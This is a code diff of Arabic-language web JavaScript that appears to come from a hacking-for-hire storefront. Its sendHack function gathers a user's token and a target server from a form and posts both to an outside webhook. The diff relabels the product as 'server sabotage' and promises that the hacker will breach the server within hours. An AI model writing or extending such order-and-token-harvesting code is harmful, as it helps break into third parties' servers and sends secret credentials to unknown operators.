@@ -233,11 +233,11 @@ addOrder(product);
 function sendHack(){
 const token = document.getElementById('hackToken').value;
 const server = document.getElementById('hackServer').value;
-const product = 'أدوات سيرفرات';
+const product = 'تخريب سيرفرات';
 if(!token || !server){ showPopup('❗ اكتب جميع الحقول'); return; }
 if(!canSend(product)) return;
 fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify({content: token+' | '+server})});
-showPopup('تم ارسال الطلب يرجى الانتظار لمدت 48 ساعه');
+showPopup('تم ارسال طلبك الى الهكر سيتم اختراق السيرفر خلال بضع ساعات');
 addOrder(product);
 }
 
